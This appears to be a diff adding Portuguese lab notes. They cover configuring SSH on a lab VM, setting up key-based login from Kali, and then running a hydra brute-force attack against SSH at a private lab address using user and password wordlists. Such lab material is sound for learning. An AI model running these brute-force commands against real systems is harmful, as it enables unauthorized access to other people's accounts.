@@ -1,0 +1,35 @@
+configurando ssh
+
+------ na vm2
+nano /etc/ssh/sshd_config
+descomentar linha: PasswordAuthentication no
+comentar linhas: Pubkeyauthentication e ChallengeResponseAuthentication
+service ssh restart
+
+
+------- no kali
+-- adicionar chave publica do kali no servidor (não usar root)  
+ls -la
+cd .ssh
+ssh-keygen -t rsa
+cat id_rsa.pub
+ssh-copy-id aluno@192.168.10.30
+ssh aluno@192.168.10.30
+
+
+------------------------------------------------------------------------
+
+
+ataque de força bruta (para  descobrir usuário e senha)
+
+----- no kali
+sudo su (no root)
+cd documents
+echo senha.txt
+cat senha.txt
+nano senha.text - adicionar senhas aleatórias
+echo usuario.txt
+nano usuario.txt - adicionar usuários
+hydra -l aluno -P senha.txt 192.168.10.30 ssh --- quando vc sabe o usuário
+hydra -L usuario.txt -P senha.txt 192.168.10.30 ssh --- quando não sabe o usuário
+
